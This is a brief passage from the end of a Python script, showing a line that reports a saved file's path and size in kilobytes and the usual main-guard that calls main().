    print(f"Saved → {out}  ({out.stat().st_size // 1024} KB)")


if __name__ == "__main__":
    main()
